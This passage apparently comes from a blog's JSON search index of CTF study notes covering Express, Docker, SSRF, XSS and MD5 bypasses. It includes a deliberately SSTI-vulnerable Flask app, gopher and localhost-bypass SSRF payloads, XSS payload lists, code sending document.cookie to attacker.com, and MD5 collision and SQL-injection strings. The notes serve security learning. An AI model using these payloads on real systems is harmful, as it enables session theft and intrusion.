(matrix[0][2] === matrix[1][1] &amp;&amp; matrix[1][1] === matrix[2][0] &amp;&amp; matrix[2][0] === &#x27;O&#x27;)&#123; winner = 2; &#125; if (draw(matrix) &amp;&amp; winner === null)&#123; res.send(JSON.stringify(&#123;winner: 0&#125;)) &#125; else if (winner !== null) &#123; res.send(JSON.stringify(&#123;winner: winner&#125;)) &#125; else &#123; res.send(JSON.stringify(&#123;winner: -1&#125;)) &#125; &#125;)app.listen(3000, () =&gt; &#123; console.log(&#x27;app listening on port 3000!&#x27;)&#125;)","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"},{"name":"node","slug":"node","permalink":"http://example.com/tags/node/"},{"name":"prototyoe","slug":"prototyoe","permalink":"http://example.com/tags/prototyoe/"}],"author":"arkcimi"},{"title":"node","slug":"node","date":"2024-03-24T07:37:31.000Z","updated":"2024-03-25T08:21:29.794Z","comments":true,"path":"node/","link":"","permalink":"http://example.com/node/","excerpt":"","text":"js&#x3D;&gt; function123456789var fun = function(a)&#123; return 2*a;&#125;let a = [1,2,3,4,5,6];console.log(a);let b = a.map(fun);console.log(b); 12[ 1, 2, 3, 4, 5, 6 ][ 2, 4, 6, 8, 10, 12 ] 用箭头函数简化 12345let a = [1,2,3,4,5,6];console.log(a);let b = a.map(a =&gt; 2*a);console.log(b); module require &#x2F; exports11234const multiply = (a, b) =&gt; &#123; return a * b;&#125;;module.exports = multiply; //function name 12const my_multiply = require(&#x27;./utils&#x27;);console.log(my_multiply(3, 4)); s123456789101112function add(a, b) &#123; return a + b;&#125;function multiply(a, b) &#123; return a * b;&#125;module.exports = &#123; add, multiply&#125;; 123const math = require(&#x27;./utils&#x27;);console.log(math.add(3,4));console.log(math.multiply(3,4)); compose打开项目位置 12npm initnpm install express get&#x2F;post123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263const express = require(&#x27;express&#x27;);const fs = require(&#x27;fs&#x27;)const app = express();// //中间件// const logMiddleware = (req, res, next) =&gt;&#123;// const &#123;method, url, ip&#125; = req; //req.method// const currentTime = new Date().toISOString();// const logEntry = `$&#123;currentTime&#125; - $&#123;ip&#125; - $&#123;method&#125;$&#123;url&#125;\\n`;// fs.appendFile(&#x27;logs.txt&#x27;, logEntry, (err) =&gt; &#123;// if(err)&#123;// console.error(&quot;Failed to log, err:&quot;, err);// &#125;// &#125;);// next();// &#125;app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);app.set(&#x27;views&#x27;, &#x27;./view&#x27;);app.use((req, res, next) =&gt; &#123; console.log(`[$&#123;new Date().toISOString()&#125;] $&#123;req.method&#125; $&#123;req.url&#125;`); next();&#125;);app.use(express.urlencoded(&#123;extended: false&#125;));app.use((err, req, res, next) =&gt; &#123; console.error(err.stack); res.status(500).send(`Internet server error`);&#125;);app.get(&#x27;/&#x27;, (req, res) =&gt; &#123; const products = [&#x27;Apple&#x27;, &#x27;Banana&#x27;, &#x27;Orange&#x27;]; res.render(&#x27;index&#x27;, &#123;title: products&#125;);&#125;);app.get(&#x27;/get&#x27;, (req, res) =&gt; &#123; const que = req.query.id; res.send(`Email : $&#123;que&#125;`);&#125;);app.get(&#x27;/get/:id&#x27;, (req, res) =&gt; &#123; const userId = req.params.id; res.send(`User ID : $&#123;userId&#125;`);&#125;);app.post(&#x27;/post&#x27;, (req, res) =&gt; &#123; const &#123;name, email&#125; = req.body; res.status(201).json(&#123;message: `User($&#123;name&#125;) created successfully, add`&#125;); console.log(req.body);&#125;);app.listen(3000, () =&gt; &#123; console.log(&#x27;Server is running on port 3000&#x27;);&#125;);","categories":[],"tags":[],"author":"arkcimi"},{"title":"internet","slug":"internet","date":"2024-03-24T06:50:28.000Z","updated":"2024-03-25T03:56:16.966Z","comments":true,"path":"internet/","link":"","permalink":"http://example.com/internet/","excerpt":"","text":"Internetrouteroute就是一条路由, 它将一个URL路径和一个函数进行映射, 例如: 12/users -&gt; getAllUsers()/users/count -&gt; getUsersCount() 动态路由 在路径中传入参数 Express 123app.get(&#x27;/user/:id&#x27;, (req, res, next) =&gt; &#123; // ... ...&#125;) Flask 123@app.route(&#x27;/user/&lt;user_id&gt;&#x27;)def get_user_info(user_id): pass 地址物理地址 MacMAC地址具有唯一性, 每个硬件出厂时候的MAC地址是固定的 内网就是 局域网(Local Area Network,LAN) 是指在某一区域内由多台计算机互联成的计算机组 以下IP是内网IP的类型 12310.0.0.0~10.255.255.255172.16.0.0~172.31.255.255192.168.0.0~192.168.255.255 外网就是 广域网(Wide Area Network,WAN) , 又称公网.是连接不同地区局域网或城域网计算机通信的远程网 网关(路由器)(网关就是连接两个网络的节点, 两个IP地址分别捆绑在不同的网卡上), 代理访问外部网络 内网的计算机以 NAT(网络地址转换)协议 , 通过一个公共的网关访问Internet return 状态码 含义 描述 100 继续 客户端应当继续发送请求。 101 切换协议 服务器根据客户端的请求切换协议。 200 OK 请求成功。一般用于GET与POST请求。 201 已创建 请求成功并且服务器创建了新的资源。 202 接受 已接受请求，但未处理完成。 203 非授权信息 请求成功，但返回的元信息不在原始服务器上，而是从一个副本返回的。 204 无内容 服务器成功处理，但未返回内容。 205 重置内容 服务器处理成功，用户终端（例如：浏览器）应重置文档视图。 206 部分内容 服务器成功处理了部分GET请求。 300 多种选择 请求的资源可包含多个位置，可用于自动选择服务器。 301 永久移动 请求的资源被永久的移动到新URI，返回信息会包括新的URI。 302 临时移动 与301类似，但资源只是临时被移动。 303 查看其他位置 请求对应的资源存在着另一个URI，应使用GET方法获取该资源。 304 未修改 资源未改变。 305 使用代理 被请求的资源必须通过指定的代理获取。 306 已经废弃 在以前版本的HTTP中使用。 307 临时重定向 与302类似，但对于POST请求，会跳转到新的URI并使用GET方法。 400 错误请求 请求中有语法问题，或不能满足请求。 401 未授权 需要证明身份。 402 需要付款 预留的响应，目前未被使用。 403 被禁止访问 服务器拒绝请求。 404 找不到 无法找到所请求的资源。 405 不允许的方法 请求中的方法被禁止。 406 不可接受 服务器只能生成客户端不接受的响应。 407 需要代理验证 客户端必须通过代理授权。 408 请求超时 服务器等待请求超时。 409 冲突 服务器在满足请求时发现冲突。 410 过期 请求的资源已经不存在。 411 需要长度 服务器无法处理不包含Content-Length的请求信息。 412 未满足前提条件 服务器未满足客户端在请求中设置的其中一个前提条件。 413 请求实体过大 请求的实体过大，服务器无法处理。 414 请求URI过长 请求URI过长，服务器无法处理。 415 不支持媒体类型 请求的格式不受请求页面的支持。 416 请求范围不满足 请求中包含的Range头字段不能与响应中的实体兼容。 417 未满足期望 服务器不能满足Expect头字段指定的预期。 500 服务器内部错误 服务器遇到了一个未曾预料的状况，导致不能完成客户端请求。 501 未实现 服务器不支持当前请求所需要的某个功能。 502 错误网关 当作为一个代理或者网关时，处理其他服务器的响应失败。 503 服务器目前无法使用 由于过载或者维护，服务器暂时无法处理请求。 504 网关超时 作为一个网关或者代理工作的服务器尝试执行请求时，未能及时从上游服务器收到响应。","categories":[{"name":"Internet","slug":"Internet","permalink":"http://example.com/categories/Internet/"}],"tags":[{"name":"internet","slug":"internet","permalink":"http://example.com/tags/internet/"}],"author":"arkcimi"},{"title":"docker","slug":"docker","date":"2024-03-22T11:25:10.000Z","updated":"2024-04-22T09:11:40.049Z","comments":true,"path":"docker/","link":"","permalink":"http://example.com/docker/","excerpt":"","text":"download update the apt package index and install packages to allow apt to use a repository over HTTPS 123456sudo apt-get install \\ ca-certificates \\ curl \\ gnupgsudo install -m 0755 -d /etc/apt/keyrings add Docker’s officialGPG key 123curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpgsudo chmod a+r /etc/apt/keyrings/docker.gpg set up therepository 123456echo \\ &quot;deb [arch=&quot;$(dpkg --print-architecture)&quot; signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \\ &quot;$(. /etc/os-release &amp;&amp; echo &quot;$VERSION_CODENAME&quot;)&quot; stable&quot; | \\ sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/nullsudo apt-get update install Docker Engine, containerd, and Docker Compose 1sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin run1sudo docker run hello-world runningversion1sudo docker version status1sudo service docker status mirror images1sudo docker images use[name] &#x3D; [repository]:[tag] pull or remove12docker pull [name]docker rmi [name] save or load12docker save -o [filename] [name] docker load -i [filename] container1234567docker rundocker psdocker pausedocker unpausedocker stopdocker startdocker rm trypull nginx1docker pull nginx run12sudo docker run --name mn -p 80:80 -d nginx3d40601837eb0400d943ed2ee3c151e4eb35fb8e6b834c51b7d93ff2e0867893 some options options usage -d, –detach Run container in background and print container ID -p, –publish list Publish a container’s port(s) to the host –name string set name -e MYSQL_ROOT_PASSWORD&#x3D;123456 deploy internet|-h, –hostname string|Container host name| exec1sudo docker exec -it mn bash now it looks like a linux system 12cd /usr/share/nginx/htmlsed -i -e &#x27;s#Welcome to nginx#Hello Docker#g&#x27; -e &#x27;s#&lt;head&gt;#&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;#g&#x27; index.html volume1234docker volume create htmldocker volume lsdocker volume inspect htmldocker volume rm html now start12345docker volume create htmldocker volume inspect htmldocker run --name mn -v html:/usr/share/nginx/html -p 80:80 -d nginxcd /path/to/volume/htmlvim index.html build搭一个简单的py SSTI环境1234567891011121314151617181920from flask import ( Flask, request, redirect, render_template_string,)app = Flask(__name__)@app.route(&quot;/&quot;)def index(): return redirect(&quot;/test&quot;)@app.route(&quot;/test&quot;,methods=[&quot;GET&quot;, &quot;POST&quot;])def test(): if request.method == &quot;GET&quot;: name = request.args.get(&quot;name&quot;) return render_template_string(&quot;&lt;h1&gt;%s&lt;/h1&gt;&quot; % name)if __name__ == &quot;__main__&quot;: app.run(&quot;0.0.0.0&quot;, 5000) Dockerfile 1234567FROM python:3.8-alpineWORKDIR /appCOPY . /app RUN pip install --upgrade pipRUN pip install flaskCMD [&quot;python&quot;,&quot;app.py&quot;] 12docker build -t pyssti .docker images 1docker run --name ps1 -p 80:5000 -d pyssti nginxDokerfile 1234567891011121314151617181920212223242526272829303132333435363738FROM ubuntu:14.04 MAINTAINER name&lt;num@qq.com&gt; ENV REFRESHED_AT 2019-8-14 ENV LANG C.UTF-8#更换源RUN sed -i &#x27;s/http:\\/\\/archive.ubuntu.com\\/ubuntu\\//http:\\/\\/mirrors.163.com\\/ubuntu\\//g&#x27; /etc/apt/sources.list#更新RUN apt-get update -y#防止Apache安装过程中地区的设置出错ENV DEBIAN_FRONTEND noninteractive # 如 安装mysqlRUN apt-get -y install mysql-server# 安装apache2RUN apt-get -yqq install apache2# 安装php5RUN apt-get -yqq install php5 libapache2-mod-php5# 安装php扩展RUN apt-get install -yqq php5-mysql php5-curl php5-gd php5-intl php-pear php5-imagick php5-imap php5-mcrypt php5-memcache php5-ming php5-ps php5-pspell php5-recode php5-snmp php5-sqlite php5-tidy php5-xmlrpc php5-xsl#配置Apache信息RUN echo &quot;ServerName localhost:80&quot; &gt;&gt; /etc/apache2/apache2.conf#移除Apache初始界面RUN rm -rf /var/www/html/index.html RUN sed -i &#x27;s/Options Indexes FollowSymLinks/Options None/&#x27; /etc/apache2/apache2.conf#复制本地www文件夹下的文件到apache的网站目录ADD ./www /var/www/html COPY start.sh /root/start.sh RUN chmod +x /root/start.sh ENTRYPOINT cd /root; ./start.sh EXPOSE 80 start.sh 12345678910111213 sleep 1#启动mysqlfind /var/lib/mysql -type f -exec touch &#123;&#125; \\; &amp;&amp; service mysql start#设置mysql的root用户密码mysqladmin -u root password &quot;root&quot; mysql -uroot -proot -e &quot;CREATE DATABASE IF NOT EXISTS ctf&quot; #启动apache/usr/sbin/apache2ctl -D FOREGROUND# service apache2 start# /bin/bash 1234sudo docker build -t easysql .sudo docker run --name easysql1 -p 80:80 -d easysqlsudo docker exec -it easysql1 bashmysql -uroot -proot 12345show databases;create database mydb_one;use mydb_one;create table flag (flag varchar(20));insert into flag (flag) values (&#x27;NSSCTF&#123;45&#125;&#x27;);","categories":[{"name":"INTERNET","slug":"INTERNET","permalink":"http://example.com/categories/INTERNET/"}],"tags":[{"name":"-docker","slug":"docker","permalink":"http://example.com/tags/docker/"}],"author":"arkcimi"},{"title":"ssrf","slug":"ssrf","date":"2024-03-09T01:02:55.000Z","updated":"2024-04-20T02:57:24.626Z","comments":true,"path":"ssrf/","link":"","permalink":"http://example.com/ssrf/","excerpt":"","text":"SSRFServer-Side Request Forgery(服务器端请求伪造) 是一种由攻击者构造请求，由 服务端 发起请求的安全漏洞; 一般情况下，SSRF攻击的目标是外网无法访问的内网系统，也正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔绝的内部系统 functioncurl1234567$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#x27;url&#x27;]);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);$result = curl_exec($ch);curl_close($ch);echo $result; file12345file_get_contents($url)readfile($url) fopen() fsockopen1234567891011121314151617fsockopen($hostname ,$port, $errno, $errstr, $timeout) //打开一个网络连接或者一个Unix 套接字连接。&lt;?php$host=$_GET[&#x27;url&#x27;];$fp = fsockopen($host, 80, $errno, $errstr, 30);if (!$fp) &#123; echo &quot;$errstr ($errno)&lt;br /&gt;\\n&quot;;&#125; else &#123; $out = &quot;GET / HTTP/1.1\\r\\n&quot;; $out .= &quot;Host: $host\\r\\n&quot;; $out .= &quot;Connection: Close\\r\\n\\r\\n&quot;; fwrite($fp, $out); while (!feof($fp)) &#123; echo fgets($fp, 128); &#125; fclose($fp);&#125;?&gt; CGI protocolCGI 1234567当用户访问我们的 Web 应用时，会发起一个 HTTP 请求。最终 Web 服务器接收到这个请求。Web 服务器创建一个新的 CGI 进程。在这个进程中，将 HTTP 请求数据已一定格式解析出来，并通过标准输入和环境变量传入到 URL 指定的 CGI 程序（PHP 应用 $_SERVER）。Web 应用程序处理完成后将返回数据写入到标准输出中，Web 服务器进程则从标准输出流中读取到响应，并采用 HTTP 协议返回给用户响应。从功能上来讲，CGI 协议已经完全能够解决 Web 服务器与 Web 应用之间的数据通信问题。但是由于每个请求都需要重新 fork 出 CGI 子进程导致性能堪忧，所以基于 CGI 协议的基础上做了改进便有了 FastCGI 协议，它是一种常驻型的 CGI 协议。 urlencode1234567891011gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1Host: 127.0.0.1:80Content-Type: application/x-www-form-urlencodedContent-Length: 36key=3c894245c2b9b63245d5ad7217484232gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0d%0AHost:%20127.0.0.1:80%0d%0AContent-Type:%20application/x-www-form-urlencoded%0d%0AContent-Length:%2036%0d%0A%0d%0Akey=3c894245c2b9b63245d5ad7217484232%0d%0agopher%3A%2F%2F127.0.0.1%3A80%2F_POST%2520%2Fflag.php%2520HTTP%2F1.1%250d%250AHost%3A%2520127.0.0.1%3A80%250d%250AContent-Type%3A%2520application%2Fx-www-form-urlencoded%250d%250AContent-Length%3A%252036%250d%250A%250d%250Akey%3D3c894245c2b9b63245d5ad7217484232%250d%250a 绕过开头must begin with xxxx 1?url=xxxx@127.0.0.1/flag.php num - - localhost, 0.0.0.0 7F000001 十六进制 2130706433 十进制 符号123ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; http://example.comList:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 句号1127。0。0。1 &gt;&gt;&gt; 127.0.0.1 DNSruanyifeng","categories":[],"tags":[],"author":"arkcimi"},{"title":"xss","slug":"xss","date":"2024-03-03T05:13:27.000Z","updated":"2024-04-04T05:42:59.502Z","comments":true,"path":"xss/","link":"","permalink":"http://example.com/xss/","excerpt":"","text":"learn简介xss(Cross Site Script) 跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的 ctfer通过php的输出函数将javascript代码输出到html页面 比如 alert() &#x2F;&#x2F;有关xss的image 常见XSS攻击方式script123&lt;script&gt; alert(1);&lt;/script&gt; image&#x2F;video123&lt;img src=1 onerror=alert(1)&gt;&lt;video&gt;&lt;source onerror=alert(1)&gt;&lt;audio src=1 onerror=alert(1)&gt; source 不存在，就会触发error input12345&quot;alert(1);&quot; or alert(1)&lt;input onfocus=alert(1)&gt; &lt;!-- 点击(聚焦)输入框 --&gt;&lt;input onblur=alert(1) autofocus&gt;&lt;input autofocus&gt; &lt;!-- autofocus:自动聚焦该输入框, onblur:聚焦离开 --&gt;&lt;input οnclick=alert(1)&gt; &lt;!--这样需要点击一下输入框--&gt;&lt;input onmouseover=alert(1)&gt; &lt;!--需要鼠标划过输入框--&gt; detail12&lt;details ontoggle=alert(1)&gt; &lt;!-- 切换状态 --&gt;&lt;details open ontoggle=alert(1)&gt; &lt;!-- 自动切换状态 --&gt; svg1&lt;svg onload=alert(1)&gt; select12&lt;select onfocus=alert(1)&gt;&lt;/select&gt;&lt;select onfocus=alert(1) autofocus&gt; &lt;!-- 自动切换状态 --&gt; iframe1&lt;iframe onload=alert(1)&gt;&lt;/iframe&gt; body123&lt;body onload=alert(1);&gt;&lt;body onscroll=alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt; &lt;!-- 滚动 --&gt; textarea123&lt;textarea onfocus=alert(1) autofocus&gt;&lt;keygen autofocus onfocus=alert(1)&gt; &lt;!--仅限火狐--&gt;&lt;marquee onstart=alert(1)&gt;&lt;/marquee&gt; &lt;!--Chrome不行，火狐和IE都可以--&gt; isindex1&lt;isindex type=image src=1 onerror=alert(1)&gt;//仅限于IE source反射型123456&lt;body&gt; &lt;form action=&quot;action.php&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt; &lt;/form&gt;&lt;/body&gt; 前端没什么 1234&lt;?php $name = $GET[&#x27;name&#x27;]; echo $name;?&gt; 存储型123456&lt;body&gt; &lt;form action=&quot;action.php&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt; &lt;/form&gt;&lt;/body&gt; 12345678&lt;?php $name = $GET[&#x27;name&#x27;]; mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;); mysql_select_db(&quot;database_name&quot;); $sql=&quot;insert into table_name value (1,&#x27;$name&#x27;)&quot;; $result=mysql_query($sql); echo $name;?&gt; 123456789&lt;?php mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;); mysql_select_db(&quot;database_name&quot;); $sql=&quot;select * from table_name where id=1&quot;; $result=mysql_query($sql); while($row=mysql_fetch_array($result))&#123; echo $row[&#x27;name&#x27;]; &#125;?&gt; 插入的时候防止闭合 ‘$name’ , 123&lt;script&gt; alert(\\&#x27;hack\\&#x27;);&lt;/script&gt; DOMtry1What&#x27;s your name 随便输一个名字 1&lt;h1&gt;&quot;Hello name&quot;&lt;/h1&gt; 注一个alert试试 123456&lt;h1&gt; &quot;Hello &quot; &lt;script&gt; alert(1) &lt;/script&gt;&lt;/h1&gt; document.cookie在成功触发 XSS 后，可以使用 JavaScript 的 document.cookie 属性来获取当前网站的 Cookie 发送 XMLHttpRequest 123var xhr = new XMLHttpRequest();xhr.open(&quot;GET&quot;, &quot;http://attacker.com/steal-cookie?data=&quot; + encodeURIComponent(document.cookie), true);xhr.send(); 利用标签或其他资源加载: 攻击者可以构造一个 URL，将用户的 Cookie 作为查询参数， 1&lt;img src=&quot;http://attacker.com/steal-cookie?data=&lt;cookie_value&gt;&quot; /&gt; 实际操作时，方法1的 ‘+’ 会被url解析而丢失 我改进了一下 123var xhr = new XMLHttpRequest();xhr.open(&quot;GET&quot;, &quot;http://attacker.com/steal-cookie?data=&quot;.concat(encodeURIComponent(document.cookie), true));xhr.send(); 各类绕过大小写html 标签不区分大小写 123&lt;ScRiPt&gt; alert(1);&lt;/ScRiPt&gt; preg_replace双写绕过 空格12/**/%09,%0a 编码绕过1234javascriptjavascripu0074 //unicodejavascrip%74 //urlencodeString.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59) @@符号绕过url限制 1https://www.segmentfault.com@xss.haozi.me/j.js 其实访问的是@后面的内容 testDOM jump不能输入name 找到一段代码 1234var target = location.search.split(&quot;=&quot;)if (target[0].slice(1) == &quot;jumpto&quot;) &#123; location.href = target[1];&#125; newlocation.search又名查询字符串，返回url中?以及之后的字符串 splitstringObject.split(separator,howmany) 参数 描述 separator 必需。字符串或正则表达式，从该参数指定的地方分割 stringObject howmany 可选。该参数可指定返回的数组的最大长度。如果设置了该参数，返回的子串不会多于这个参数指定的数组。如果没有设置该参数，整个字符串都会被分割，不考虑它的长度 slice截取字符串 12slice(start)slice(start,end) location.href当前文档的完整url，如果被改变，文档将会导航到另一个新的页面 payload1?jumpto=var xhr = new XMLHttpRequest();xhr.open(&quot;GET&quot;, &quot;http://attacker.com/steal-cookie?data=&quot;.concat(encodeURIComponent(document.cookie), true));xhr.send(); 但 &#x3D; 会截取多个片断 用url编码 1%3D","categories":[],"tags":[],"author":"arkcimi"},{"title":"md5","slug":"md5","date":"2023-12-27T14:23:34.000Z","updated":"2024-02-29T14:10:37.878Z","comments":true,"path":"md5/","link":"","permalink":"http://example.com/md5/","excerpt":"","text":"md5绕过弱比较以0e开头，PHP会当作科学计数法来处理，也就是0的n次方，得到的值弱比较的时候都相同 $a md5($a) 240610708 0e462097431906509019562988736854 QLTHNDT 0e405967825401955372549139051580 QNKCDZO 0e830400451993494058024219903391 PJNPDWY 0e291529052894702774557631701704 NWWKITQ 0e763082070976038347657360817689 NOOPCJF 0e818888003657176127862245791911 MMHUWUV 0e701732711630150438129209816536 MAUXXQC 0e478478466848439040434801845361 绕过与自己弱比较0e215962017 md5后也是以0e开头 SQLffifdyop经过md5后结果为276f722736c95d99e921722cf9ed621c再经过hex2bin结果为’or’6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c 129581926211651571912466741651878684928经过md5后结果为6143d7fc1d2f7636457abdea7a7b5e37再hex2bin后结果为\\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1’or’8 $a!&#x3D;$b &amp; md5($a)&#x3D;&#x3D;&#x3D;md5($b)数组绕过 $a!&#x3D;&#x3D;$b &amp; md5($a)&#x3D;&#x3D;&#x3D;md5($b)两个都可行 123___=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&amp;___=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab___=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2&amp;___=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%